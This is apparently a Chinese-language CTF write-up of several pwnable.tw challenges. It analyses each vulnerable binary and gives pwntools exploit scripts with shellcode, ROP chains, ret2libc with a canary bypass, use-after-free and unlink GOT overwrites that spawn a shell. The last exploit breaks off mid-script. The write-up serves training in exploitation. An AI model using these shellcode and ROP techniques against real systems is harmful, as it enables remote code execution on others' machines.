# 0x01 Start

未开启任何保护

![image-20220407150407390](pwnabletw.assets/image-20220407150407390.png)

尝试运行：

![image-20220407152551071](pwnabletw.assets/image-20220407152551071.png)

linux int80中断系统调用：eax用来存系统调用号，3是read，4是write；ebx、ecx、edx、esi等等寄存器则依次为参数。

这段代码大概意思就是：先将exit函数压入栈中，然后压入0x14字节大小的字符串，调用write打印0x14长度的字符串，随后调用read从用户输入读入0x3c大小的数据，注意ecx没有变，所以是将用户的输入从栈顶开始，于是这里就存在栈溢出。

![image-20220407150907318](pwnabletw.assets/image-20220407150907318.png)

函数栈如下：

![image-20220407160618466](pwnabletw.assets/image-20220407160618466.png)

解题思路：

没有NX保护，先构造第一次输入，覆盖返回地址ret到write函数起始`0x8048087`，利用write泄露esp0栈基址；然后构造第二次输入将返回地址ret_addr覆盖成shellcode起始地址(esp0+14h)，注意第二次read起始地址不是esp0，是esp0-4的位置。

构造exp：

```python
from pwn import*

p = remote('chall.pwnable.tw',10000)
shellcode = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
#gdb.attach(p)
payload = 'a'*0x14+p32(0x08048087)
#payload = shellcode
#gdb.attach(p)
p.send(payload)
p.recvn(0x14)
esp0 = u32(p.recv(4))
payload = 'a'*0x14+p32(esp0+0x14)+shellcode
p.send(payload) 
p.interactive()
```

> FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}

# 0x02 orw

![image-20220407161540072](pwnabletw.assets/image-20220407161540072.png)

![image-20220407161713082](pwnabletw.assets/image-20220407161713082.png)

这里用到沙盒seccomp，详情[参考](https://blog.51cto.com/u_15127593/3259635)

> 安全计算模式 seccomp（Secure Computing Mode）是自 Linux 2.6.10 之后引入到 kernel 的特性。一切都在内核中完成，不需要额外的上下文切换，所以不会造成性能问题。目前 在 Docker 和 Chrome 中广泛使用。使用 seccomp，可以定义系统调用白名单和黑名单，可以 定义出现非法系统调用时候的动作，比如结束进程或者使进程调用失败。
>
> seccomp机制用于限制应用程序可以使用的系统调用，增加系统的安全性。
>

用seccomp-tools查看限能使用的系统调用：open, read, write，将这三个函数开头字母作为简称，也就是题名orw，orw题型总结可[参考](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)

![image-20220407165217608](pwnabletw.assets/image-20220407165217608.png)

常用shellcode为

```c
#fd = open('/home/orw/flag',0) 
s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''

#read(fd,0x804a094,0x20) 
s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''

#write(1,0x804a094,0x20) 
s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''
```

exp：

```python
#!/usr/bin/python
from pwn import *
context.log_level = 'debug'
context.binary='./orw'
io = process('orw')
#io = remote('chall.pwnable.tw', 10001)
shellcode = '''
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f		// /home/orw/flag\x00
mov eax,0x5
mov ebx,esp
xor ecx,ecx
int 0x80
mov ebx,eax
mov ecx,esp
mov edx,0x30
mov eax,0x3
int 0x80
mov ebx,1
mov eax,0x4
int 0x80
'''
shellcode = asm(shellcode)
io.recvuntil(':')
io.send(shellcode)
io.interactive()
```

> FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}

# 0x03 calc

开启NX，Canary

![image-20220407172356441](pwnabletw.assets/image-20220407172356441.png)

![image-20220407201854256](pwnabletw.assets/image-20220407201854256.png)

主函数先是一个计时器，主要在calc函数

![image-20220407201938007](pwnabletw.assets/image-20220407201938007.png)

get_expr函数作用大致为：，过滤输入，保存数字和运算符到expression中。

parse_expr解析我们所输入的表达式，计算结果，结果保存在v2[pool-1]中

eval函数为具体运算函数，pool为参数数组，pool[0]记录参数个数，pool[1], pool[2]...分别表示第一、二个参数。

![image-20220407202254358](pwnabletw.assets/image-20220407202254358.png)

> **漏洞点**
>
> 如表达式`1+2`
>
> pool[0]=2, pool[1]=1, pool[2]=2
>
> 计算过程为：
>
> pool[pool[0]-1] += pool[pool[0]]，-> pool[0]=1, pool[1]=3
>
> 当表达式为 `+100+1` 时，pool[0]=1, pool[1]=100
>
> 则计算结果为 pool[0]=101，*pool为当前数据个数，后续调用printf，这样就达任意读写内存的目的

然后calc调用printf打印结果num[0]，由于可以控制pool，所以可以在栈上实现任意读写

![image-20220408112240736](pwnabletw.assets/image-20220408112240736.png)

![image-20220408104042607](pwnabletw.assets/image-20220408104042607.png)

calc函数堆栈如图

![image-20220408160751755](pwnabletw.assets/image-20220408160751755.png)

59Ch = 359*4

ebp0 = num[359+1], ret = num[359+1+1]，+1是因为调用printf时，`num[pool-1]`

构造系统调用gadget

```
eax=0xb 
ebx=“/bin/sh”字符串的地址 
ecx=0 
edx=0 
int 80h

'''使用ROPgadgetx
0x0805c34b : pop eax ; ret
0x080701d1 : pop ecx ; pop ebx ; ret
0x080701aa : pop edx ; ret
0x08049a21 : int 0x80
'''
eax:调用号
edx:0
ecx:0
ebx:binsh --> execv(binsh,0,0)

payload = [0x0805c34b,0xb,0x080701aa,0,0x080701d1,0,bin_sh,0x08049a21,0x6e69622f,0x0068732f]
```

本地调试calc函数，ebp中存储了ebp+20h的地址，需要先在ret地址处写入8个gadget和参数（共占32字节），然后再在栈中写入“bin/sh”。所以binsh地址可以用ebp+24h来表示

![image-20220408162334663](pwnabletw.assets/image-20220408162334663.png)

![image-20220408163317703](pwnabletw.assets/image-20220408163317703.png)

```
bin_sh = ebp+4
```

完整exp：

```python
from pwn import*
proc = './calc'
ip = 'chall.pwnable.tw' 
port = 10100
#p = process(proc)
p = remote(ip,port)
context.log_level = "Debug"
p.recvuntil('=== Welcome to SECPROG calculator ===\n')
off = 361
p.sendline("+"+str(360)) 
ebp = int(p.recvline(),10) # leak ebp
bin_sh = ebp + 4

'''
0x0805c34b : pop eax ; ret
0x080701d1 : pop ecx ; pop ebx ; ret
0x080701aa : pop edx ; ret
0x08049a21 : int 0x80
'''
#ROP_chain
payload = [0x0805c34b,0xb,0x080701aa,0,0x080701d1,0,bin_sh,0x08049a21,0x6e69622f,0x0068732f]


for i in range(len(payload)):
    p.sendline("+"+str(off+i))
    num = int(p.recvline())

    diff = payload[i] - num
    if diff > 0 :
        p.sendline("+"+str(off+i)+"+"+str(diff))
    else:
        p.sendline("+"+str(off+i)+str(diff))
    p.recvline()

#gdb.attach(p)

p.sendline()
p.interactive()
```

# 0x04 3x17

![image-20220411170403861](pwnabletw.assets/image-20220411170403861.png)

![image-20220410232652068](pwnabletw.assets/image-20220410232652068.png)

该程序是静态链接的，并且去掉了符号表，ida中的函数都是未命名的，需要找到main函数。

除了main函数外还有\_init，\_fini，_start，\_\_libc_start_main，\_\_libc_csu_init，__libc_csu_fini几个重要函数，由于程序是静态链接，所以程序入口点就是ida中的\_start函数。\_start函数会调用\_\_libc_start_main，然后再调用main函数。

![image-20220412140206719](pwnabletw.assets/image-20220412140206719.png)

![image-20220412142047840](pwnabletw.assets/image-20220412142047840.png)

根据\_\_libc_start_main函数原型得到其参数：main, argc, ubp_av, init, fini, rtld_fini。再根据64位调用约定（rdi, rsi, rdx, rcx, r8, r9），得知rdi中就是main函数地址。

![image-20220412143712073](pwnabletw.assets/image-20220412143712073.png)

>  *0，1，2* *文件描述符*fd代表标准输入设备（比如键盘），标准输出设备（显示器）和标准错误

main函数主要功能：输入一个地址，然后在函数`sub_40EE70`中进行变化，然后再向变化后的地址里写入标准输入的内容，最后还有个栈溢出检查。

![image-20220412154528238](pwnabletw.assets/image-20220412154528238.png)

动调得知，输入999，输出0x3e7（999），函数`sub_40EE70`作用是将输入字符串转换成16进制整型。所以可以向任意地址写任意内容，是一个任意地址写漏洞，写入大小最大位0x18字节。

参考wp思路，在main函数启动前后，会执行init和fini函数分别执行初始化和收尾工作，而init和fini函数由\_\_libc_csu_init()和__libc_csu_fini()调用。通过覆盖finit\_array数组中函数地址就可以在main函数结束之后控制函数执行流。

```c
void
__libc_csu_fini (void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();

# ifndef NO_INITFINI
  _fini ();
# endif
#endif
}
```

查看\_\_libc_csu_fini源码，可知__fini_array中的函数是逆序调用的。

one_gadget查看程序并没有找到 “/bin/sh” 或者后门函数，需要构造ROP。

![image-20220412200544687](pwnabletw.assets/image-20220412200544687.png)

查看.fini_array段，发现存在两个函数。将fini_array[1]修改成main函数，fini_array[0]改为libc_csu_fini函数，即可实现循环调用main。

![image-20220412201246085](pwnabletw.assets/image-20220412201246085.png)

之后就可以无限次数任意内容写入，从而构造ROP

```python
bin_sh = 随便一个地址都行
payload = [0x0805c34b,0x3b,0x000406c30,0,0x00446e35,0,0x0401696,bin_sh,0x00471db5]

'''
0x000000000041e4af : pop rax ; ret
0x0000000000401696 : pop rdi ; ret
0x0000000000406c30 : pop rsi ; ret
0x0000000000446e35 : pop rdx ; ret
0x0000000000471db5 : syscall ; ret
'''
```

然后需要考虑的就是如何获取栈位置写入ROP，之后再写入劫持指令地址到fini_array[0]来打破main-libc_csu_fini循环跳转更改栈顶即可。

![image-20220413101651137](pwnabletw.assets/image-20220413101651137.png)

\_\_libc_csu_fini中rbp作为fini_array[]寻址的一个寄存器，此时`rbp=0x4B40F0`。

若将跳转函数劫持到`leave ret`指令时，（leave = mov rsp, rbp pop rbp），则有

```
mov rsp, rbp;
rsp = rbp = 0x4B40F0
pop rbp;
rbp = [rsp] = [0x4B40F0] //fini_array[0]
rsp = 0x4B40F8
ret;
rip = [rsp] = [0x4B40F8] //fini_array[1]
rsp = 0x4B4100
```

这样就实现了劫持rsp，保证之后rip位置的代码不破坏栈结构，切存在ret指令来触发我们构造的ROP。

此时rip还是为main函数地址，但是注意开头有个变量检测（会溢出清0重新置1，所以会一直循环任意地址写），当不满足会直接返回，所以并不会破坏栈结构。

exp.py

```python
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
ip = 'chall.pwnable.tw'
port = 10105

fini_array = 0x4B40F0
main_addr = 0x401B6D
__libc_csu_fini = 0x402960

#io = process("./3x17")
io = remote(ip, port)

#addr1 = str(fini_array)
#data1 = p64(__libc_csu_fini)+p64(main_addr)

def write_data(addr, data):
	io.recv()
	io.send(str(addr))
	io.recv()
	io.send(data)

write_data(fini_array,p64(__libc_csu_fini)+p64(main_addr))

rsp = 0x4B4100
bin_sh_addr = 0x00000000004B41C0 # data段随便找的一个空位置写入

'''
0x000000000041e4af : pop rax ; ret
0x0000000000401696 : pop rdi ; ret
0x0000000000406c30 : pop rsi ; ret
0x0000000000446e35 : pop rdx ; ret
0x0000000000471db5 : syscall ; ret
0x0000000000401c4b : leave ; ret
'''
rax_addr = 0x000000000041e4af
rdi_addr = 0x0000000000401696
rsi_addr = 0x0000000000406c30
rdx_addr = 0x0000000000446e35
syscall_addr = 0x0000000000471db5
leaveret_addr = 0x0000000000401c4b

write_data(bin_sh_addr, '/bin/sh\x00')

write_data(rsp, p64(rax_addr)+p64(0x3b))
write_data(rsp+16, p64(rdi_addr)+p64(bin_sh_addr))
write_data(rsp+32, p64(rsi_addr)+p64(0))
write_data(rsp+48, p64(rdx_addr)+p64(0))
write_data(rsp+64, p64(syscall_addr))

write_data(fini_array, p64(leaveret_addr))

io.interactive()
```

![image-20220413111154973](pwnabletw.assets/image-20220413111154973.png)

知识点：x64静态编译程序的fini_array劫持

> 参考：
>
> [https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)](https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)

# 0x05 dubblesort

![image-20220413152507489](pwnabletw.assets/image-20220413152507489.png)

保护全开

![image-20220414101746848](pwnabletw.assets/image-20220414101746848.png)

运行发现会泄露内存

![image-20220413195145247](pwnabletw.assets/image-20220413195145247.png)

> 漏洞点：
>
> 1. n大小没有限制，栈空间有限，可以造成栈溢出漏洞
> 2. read函数，用来读取name，read通过输入字符的回车就截断了，如果这个回车后面不是00，printf就会一起打印出来，可以用来泄露栈中内容

利用：

考虑使用ret2libc，获取题目提供的libc中组件地址

![image-20220414110027194](pwnabletw.assets/image-20220414110027194.png)

**system_off = 0x3a940**

![image-20220414110226900](pwnabletw.assets/image-20220414110226900.png)

**binsh_off = 0x158e8b**

vmmap查看libc基址

![image-20220414110731919](pwnabletw.assets/image-20220414110731919.png)

输入name，查看堆栈

![image-20220414111114541](pwnabletw.assets/image-20220414111114541.png)

发现name[]偏移24和28的值为libc上的地址，计算与libc基址的偏移

```
0xf7fb7000 - 0xf7e04000 = 0x1B3000
0xf7fb5244 - 0xf7e04000 = 0x1B1244
```

`0xf7fb7000 - 0xf7e04000 = 0x1B3000`正好是本地libc中`.got.plt`偏移地址

![image-20220414113003115](pwnabletw.assets/image-20220414113003115.png)

题目给的libc中.got.plt偏移则为`0x001b0000`，之后可以用这个值来泄露目标主机中的libc基址。

具体泄露方法：

向name[]输入24*‘a’，之后由于换行符'/0x0a'会覆盖下一个dword的低字节，由于低字节为'/0x00'，所以只需要将读出来的DWORD值减去'/0x0a'，再减去.got.plt的偏移，即可得到目标主机libc基址。

**libc_addr = leak_addr - 0x0a - 0x001b0000**

![image-20220414151727881](pwnabletw.assets/image-20220414151727881.png)

之后就是考虑如何布置栈结构，sort函数会对我们的输入进行排序

程序开启了canary保护，会检测栈溢出情况，需要进行绕过。读入数字的代码是scanf

![image-20220414150356350](pwnabletw.assets/image-20220414150356350.png)

> 按wp的说法是scanf无法识别非法字符或者是无效字符
>
> - 非法字符指不是%u类型的字符，如a, b, c等
> - 无效字符指合法但无法识别的字符，如+, -
>
> 如果输入非法字符，输入流不清空，非法字符一直会一直留在stdin，这样剩下的scanf读入的都是非法字符，pass。所以可以通过输入`+`或`-`，因为这两个符号可以定义正负数，如果输入数字替换成这两个数字，读入只会视为无效而不是非法，canary不会被修改。

ret2libc具体利用堆栈如下：

![image-20220414161902805](pwnabletw.assets/image-20220414161902805.png)

exp：

```python
from pwn import *
#context(arch="i386",os="linux",log_level="debug")
#io = process('./dubblesort')
io = remote('chall.pwnable.tw', 10101)


io.recvuntil('What your name :')
io.sendline('A'*24)
leak_addr = u32(io.recv()[30:34]) - 0x0a


''' local libc
libc_addr = leak_addr - 0x1B3000
system_addr = libc_addr + 0x0003adb0
binsh_addr = libc_addr + 0x0015bb2b
'''

libc_addr = leak_addr -  0x001b0000
system_addr = libc_addr + 0x3a940
binsh_addr = libc_addr +  0x158e8b

#io.recvuntil('How many numbers do you what to sort :')
io.sendline('35')

for i in range(24):
        io.sendline('1')
        io.recv()

io.sendline('+')

for i in range(9):
        io.sendline(str(system_addr))
        io.recv()

io.sendline(str(binsh_addr))
io.recv()

io.interactive()
```

总结：

scanf和printf泄露栈上libc地址，计算偏移得到libc基址

非法字符绕过canary完成栈溢出

然后构造栈空间return2libc

多重保护下的栈溢出

# 0x06 hacknote

开启NX、Canary保护

![image-20220415125400875](pwnabletw.assets/image-20220415125400875.png)

主要功能：增删查

![image-20220415145546371](pwnabletw.assets/image-20220415145546371.png)

main函数主要逻辑就是读取用户输入来调用不同处理函数

![image-20220415145516517](pwnabletw.assets/image-20220415145516517.png)

Add_note()函数，首先检查note数量，然后遍历ptr[i]查找空闲区域，然后做两次malloc操作，第一次创建创建note结构体，第二次创建该note的buf，从stdin读入size大小的用户输入到buf，创建完成后全局变量`Note_count`加一。

![image-20220415172006839](pwnabletw.assets/image-20220415172006839.png)

note数据结构：

![image-20220416161950281](pwnabletw.assets/image-20220416161950281.png)

print_func_addr指向打印函数，buf_ptr用户输入的内容地址

![image-20220416162143229](pwnabletw.assets/image-20220416162143229.png)

Del_note函数首先检查访问下标，若下标合法，则释放`ptr[index]`和`(void*)ptr[index]+1`，分别对应note的buf_ptr和note节点本身。但是free之后并没有对指针进行置0，造成两个悬挂指针`dangling pointer`使，用Print_node函数依然可以调用`0x804b008`这个地址的函数，导致可以对释放后的指针进行操作，造成Use After Free。

free之后，note分配的指针

![image-20220420160848252](pwnabletw.assets/image-20220420160848252.png)

free之后，note内容分配的指针

![image-20220419153728210](pwnabletw.assets/image-20220419153728210.png)

![image-20220419161658417](pwnabletw.assets/image-20220419161658417.png)

```c
int __cdecl Print_function(int a1)
{
  return puts(*(const char **)(a1 + 4)); // Print_function将a1偏移+4作为put函数参数
}
```

利用思路：

Del_note里存在UAF，只需要修改print_func_addr的值，再调用Print_note，就可以劫持控制流

没有后门函数，需要泄露libc基址

[堆结构](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/)

```
del 0
del 1
```

可以看到两个8字节的chunk链接在一起，两个24字节的chunk链接在一起（通过previous）。

![image-20220419202024325](pwnabletw.assets/image-20220419202024325.png)

```
add(8, 'bbbbbbb')
```

选择大于等于改空间大小的chunk进行分配

![image-20220419202604605](pwnabletw.assets/image-20220419202604605.png)

写入print_note_addr和malloc函数的got，就可以泄露libc基址

然后再写入system函数地址和参数调用print_note就可以直接调用system，参数注意是本身`system_addr+参数`，可以通过'||'或';'对命令进行分割，识别`system_addr`为无效command之后再执行后续command，构造如下：

```
add(8, p32(system_addr) + ';sh\x00')
```

exp

```python
from pwn import *

context(arch="i386",os="linux",log_level="debug")
elf = context.binary = ELF('./hacknote')

#elf_libc = ELF('libc_32.so.6')
#io = remote('chall.pwnable.tw', 10102)

elf_libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
io = process('./hacknote')


print_addr = 0x0804862B

def add(size, content):
	io.recvuntil('Your choice :')
	io.send(str(1))
	io.recvuntil(':')
	io.send(str(size))
	io.recvuntil('Content :')
	io.send(content)

def delete(index):
    io.recvuntil('Your choice :')
    io.send(str(2))
    io.recvuntil('Index :')
    io.send(str(index))
 
def show(index):
    io.recvuntil('Your choice :')
    io.send(str(3))
    io.recvuntil('Index :')
    io.send(str(index))

add(16, 16*'a')

add(16, 16*'a')

delete(0)
delete(1)

add(8,p32(print_addr) + p32(elf.got['malloc']))

show(0)

malloc_got = u32(io.recvn(4)[:4])
log.success("malloc_got = " + hex(malloc_got))

libc_addr = malloc_got - elf_libc.symbols['malloc']

system_addr = libc_addr + elf_libc.symbols['system']

binsh_addr = libc_addr + 0X0015bb2b

delete(2)

add(8, p32(system_addr) + ';sh\x00')
attach(io)
show(0)

io.interactive()
```

总结：

UAF

chunk

使用中的chunk

![image-20220420161405681](pwnabletw.assets/image-20220420161405681.png)

释放后的chunk

![image-20220420161434688](pwnabletw.assets/image-20220420161434688.png)

fastbin：glibc采用单向链表对其中的每个 bin 进行组织,并且每个bin采取LIFO策略,也就是和栈一样,最近释放的chunk会被更早的分配.不同大小的chunk也不会被链接在一起,fastbin支持从16字节开始的10个相应大小的bin.

First Fit算法：空间分区以地址递增的次序链接,分配内存时顺序查找,找到大小能满足要求的第一个空闲分区.如果分配内存时存在一个大于或等于所需大小的空间chunk,glibc就会选择这个chunk.

plt、got：

![image-20220420161622281](pwnabletw.assets/image-20220420161622281.png)



# 0x07 Silver_Bullet

![image-20220420164251522](pwnabletw.assets/image-20220420164251522.png)

![image-20220420164219583](pwnabletw.assets/image-20220420164219583.png)

```
$ ./silver_bullet
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :aaaaaa
Your power is : 6
Good luck !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :aaaa
Your new power is : 10
Enjoy it !
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :4
Don't give up !
```

main函数如下，菜单模式，根据选项调用不同函数

![image-20220420200111284](pwnabletw.assets/image-20220420200111284.png)

create_bullet

![image-20220420200343428](pwnabletw.assets/image-20220420200343428.png)

read_input函数

![image-20220420200417084](pwnabletw.assets/image-20220420200417084.png)

先判断bullet是否存在，否则调用read_input读取stdio输入的description，之后根据description的长度决定bullet的power数值



power_up

![image-20220420200653742](pwnabletw.assets/image-20220420200653742.png)

判断power值是否大于47，若小于则从stdio读取`48-power`大小的字节到s，然后拼接s到bullet上，并重新计算赋值power



beat

![image-20220420201039718](pwnabletw.assets/image-20220420201039718.png)



main函数堆栈

![image-20220420201411856](pwnabletw.assets/image-20220420201411856.png)

漏洞点

strncat函数原理是将n个字符接到目标字符串后并添加\x00，若创建的时候description只输入0x20个字符，然后调用power_up添加0x10个字符就会出现以下情况：

![image-20220420205029964](pwnabletw.assets/image-20220420205029964.png)

power值被strncat添加的\x00覆盖，之后加上powerup的新值，这就导致绕过powerup中的长度判断，可以继续向堆栈写入从而导致栈溢出。

如何泄露libc基址，参考wp思路：覆盖返回地址为puts函数plt调用puts函数，然后puts函数返回地址为main函数首地址，参数为puts的got值。

由于strncat会添加\x00所以只需要7个字节就可以覆盖至返回地址处

![image-20220421105431314](pwnabletw.assets/image-20220421105431314.png)

exp

```python
from pwn import *

context(arch="i386",os="linux",log_level="debug")

elf = context.binary = ELF('./silver_bullet')

#elf_libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
#io = process('./silver_bullet')

elf_libc = ELF('libc_32.so.6')
io = remote('chall.pwnable.tw', 10103)


def Create(description):
	io.recvuntil('Your choice :')
	io.send(str(1))
	io.recvuntil(':')
	io.send(description)

def Powerup(description):
    io.recvuntil('Your choice :')
    io.send(str(2))
    io.recvuntil(':')
    io.send(description)
 
def Beat():
    io.recvuntil('Your choice :')
    io.send(str(3))

Create('A'*0x2C)
Powerup('A'*0x4)

main_addr = elf.symbols['main']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']

#Powerup(p32(0xffffffff)+p32(0xffffff)+p32(puts_plt)+p32(main_addr)+p32(puts_got))
Powerup("\xff"*7+p32(puts_plt)+p32(main_addr)+p32(puts_got))
Beat()
#gdb.attach(io)
io.recvuntil('Oh ! You win !!\n')
puts = u32(io.recv(4))
libc_addr = puts - elf_libc.symbols['puts']

Create('A'*0x2C)
Powerup('A'*0x4)

#one_gadget
one_gadget = libc_addr + 0x5f065
Powerup("\xff"*7+p32(one_gadget))

#system('/bin/sh')
system_addr = libc_addr + elf_libc.symbols['system']
binsh_addr = libc_addr + 0X158e8b
#Powerup("\xff"*7+p32(system_addr)+p32(0xffffffff)+p32(binsh_addr))

Beat()

io.interactive()
```

总结：

strncat(dest,src,n)的功能是将src的前n个字节的字符追加到dest字符串后面,然后再加上\x00结尾，不加以检查就可能会造成溢出。

栈溢出泄露libc方式：覆盖返回地址为puts的plt地址，参数选择为puts的got地址，函数返回时泄露，然后再根据偏移计算libc基址

# 0x08 applestore

![image-20220421185240684](pwnabletw.assets/image-20220421185240684.png)

```
$ ./applestore
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 1
=== Device List ===
1: iPhone 6 - $199
2: iPhone 6 Plus - $299
3: iPad Air 2 - $499
4: iPad Mini 3 - $399
5: iPod Touch - $199
> 2
Device Number> 1
You've put *iPhone 6* in your shopping cart.
Brilliant! That's an amazing idea.
> 4
Let me check your cart. ok? (y/n) > y
==== Cart ====
1: iPhone 6 - $199
> 3
Item Number> 1
Remove 1:iPhone 6 from your shopping cart.
> 5
Let me check your cart. ok? (y/n) > y
==== Cart ====
Total: $0
Want to checkout? Maybe next time!
> 6
Thank You for Your Purchase!
```

**程序分析：**

main函数，主要调用menu显示选项列表，再调用handler函数处理用户输入

![image-20220421190633686](pwnabletw.assets/image-20220421190633686.png)

handler函数用`my_read`读入用户输入，switch-case来调用选项函数

购物车双向链表结构如下，由bbs段中的myCart作为表头

![image-20220423101842066](pwnabletw.assets/image-20220423101842066.png)

```
Struct myCart{
	char* name;
	int price;
	myCart* next;
	myCart* prev;
}
```

![image-20220422102406229](pwnabletw.assets/image-20220422102406229.png)

list()

![image-20220422101624780](pwnabletw.assets/image-20220422101624780.png)

add()

![image-20220422101648213](pwnabletw.assets/image-20220422101648213.png)

add()调用insert()，insert()作用就是执行一个双向链表的插入节点的操作

![image-20220422103223732](pwnabletw.assets/image-20220422103223732.png)

delete()，这里存在一次unlink内存写操作

```
next[3]=prev
prev[2]=next
```

![image-20220422102747784](pwnabletw.assets/image-20220422102747784.png)

cart()，遍历购物车链表添加

![image-20220422103700584](pwnabletw.assets/image-20220422103700584.png)

checkout()，注意这个函数，当总价7174时会将iphone8加入购物车，但是iphone8这个结构是存储在栈上的，不同于add()中的商品都是通过create()来malloc 16字节内存存在堆上。

![image-20220422104010431](pwnabletw.assets/image-20220422104010431.png)

**漏洞点：**

也就是checkout函数，将栈上的iphone8插入链表中，导致栈地址被写入堆中，iphone8结构地址为[ebp-20h]，并且没有将next置0，而是保留了栈上原有的内容，可以造成泄露。

z3求解一下满足7174元的方程

```
from z3 import *
x = Int('x')
y = Int('y')
z = Int('z')
k = Int('k')
j = Int('j')
solve(x>0,y>0,z>0,k>0,j>0,199*x+299*y+499*z+399*k+199*j == 7174)

$ python solve.py
[k = 1, x = 10, y = 9, z = 3, j = 3]
```

尝试满足7174这个条件运行一下，可以看到再次调用cart函数遍历列表的时候会发生错误。经调试发现是栈上数据已被其他函数修改形成垃圾数据，iphone8这个结构的next指针指向地址不可访问，导致程序错误。

![image-20220423102841081](pwnabletw.assets/image-20220423102841081.png)

**利用：**

思路：使用满足iphone8的输入将可控的栈空间link到链表中，之后泄露libc基址和栈基址，之后使用delete中的unlink操作对内容进行写操作来替换got表调用system

泄露libc基址

由于checkout、add、cart、delete四个函数都由handler调用，所以调用栈的ebp相同，而iphone8这个节点存在于checkout函数栈中[ebp-20h]这个位置开始。cart函数中用户输入的buf从[ebp-22h]开始，读入大小为21字节，只要首字母为'y'就可以进行打印，大小也满足修改iphone8节点中的数据，可以利用这点造成泄露。

```python
payload1 = 'y\x00'+p32(elf.got['atoi'])+p32(1)+p32(0x0804B070)+p32(0)
```

![image-20220423123630351](pwnabletw.assets/image-20220423123630351.png)

payload1将name部分覆盖为got['atoi']，然后就可以泄露atoi的真实地址，从而得到libc基址

泄露栈地址

参考wp，得知可以使用glibc中的environ来获取栈地址。

在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。

获取之后动调程序计算得到需要泄露的栈地址与environ的偏移。

```python
environ = elf_libc.symbols['environ'] + libc_addr
payload2 = 'y\x00'+p32(environ)+p32(1)+p32(0x0804B070)+p32(0)
ebp = stack_addr - offset
```

劫持ebp

handler函数中的每个调用函数的nptr位置都是`char nptr; // [esp+26h] [ebp-22h]`。每个函数返回handler后都会对用户输入进行一次atoi的调用。

delete中存在一次unlink的内存写操作，将目标节点进行如下操作

```c
next[3]=prev
prev[2]=next
```

已知第27的iphone8节点是链表中的栈上节点，且可以通过nptr的栈溢出任意修改栈上这块位置的内容。

那么将该节点的next和prev分别设置为got['atoi']+0x22，ebp-0x8，unlink操作就等价于：

```c
next = got['atoi']+0x22;
prev = ebp-0x8;
prev[2] = ebp-0x8+0x8 = ebp = next = got['atoi']+0x22;
-> ebp = got['atoi']+0x22
```

这里的ebp指的是delete函数中ebp寄存器中存储的值，在delete调用结束之后，通过leave指令，将该值pop到handler函数的ebp寄存器中。

挟持got

回到handler函数

![image-20220424153910497](pwnabletw.assets/image-20220424153910497.png)

此时nptr地址为ebp-0x22，也就是got['atoi']+0x22-0x22 = got['atoi']。

之后调用my_read对nptr进行写入，就是直接对got表中的atoi函数地址进行写入。

```
system_addr = libc_addr + elf_libc.symbols['system']
payload3 = p32(system_addr)+'||/bin/sh\x00'
```

写入payload3，调用atoi时直接将nptr内容作为参数进行调用，getshell

exp

```python
from pwn import *

context(arch="i386",os="linux",log_level="debug")

elf = context.binary = ELF('./applestore')

#elf_libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
#io = process('./applestore')

elf_libc = ELF('libc_32.so.6')
io = remote('chall.pwnable.tw', 10104)

def add(id):
	io.recvuntil('> ')
	io.send(str(2))
	io.recvuntil('Device Number> ')
	io.send(str(id))

def delete(id):
	io.recvuntil('> ')
	io.send(str(3))
	io.recvuntil('Item Number> ')
	io.send(id)

def cart(id):
	io.recvuntil('> ')
	io.send(str(4))
	io.recvuntil('Let me check your cart. ok? (y/n) > ')
	io.send(id)

def checkout():
	io.recvuntil('> ')
	io.send(str(5))
	io.recvuntil('Let me check your cart. ok? (y/n) > ')
	io.send('y')

def get7174():
	add(1)	
	for i in range(9):
		add(1)
		add(2)
	for i in range(3):
		add(3)
		add(5)
	add(4)

get7174()

checkout()

# leaking libc
cart('y\x00'+p32(elf.got['atoi'])+p32(1)+p32(0x0804B070)+p32(0))

io.recvuntil('27: ')
atoi_addr = u32(io.recv(4))
log.success("atoi_addr = " + hex(atoi_addr))
libc_addr = atoi_addr - elf_libc.symbols['atoi']
log.success("libc_addr = " + hex(libc_addr))
'''
io.recvuntil('28: ')
